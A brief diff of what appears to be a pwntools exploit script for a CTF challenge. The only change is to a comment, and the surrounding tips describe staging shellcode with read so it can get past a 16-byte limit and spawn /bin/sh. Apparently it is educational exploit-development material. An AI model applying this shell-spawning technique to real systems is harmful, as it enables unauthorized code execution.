@@ -7,7 +7,7 @@ context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
 # Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check the registers!
 # Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") because "/bin/sh" takes 8 bytes. \
 # And why don't we call read rather than execve \
-# so we could read longer shellcode to execute "/bin/sh" ?
+# so we could read longer shellcode and execute "/bin/sh" 
 context.arch = 'amd64'
 shellcode = f'''
 mov rdx,0x100
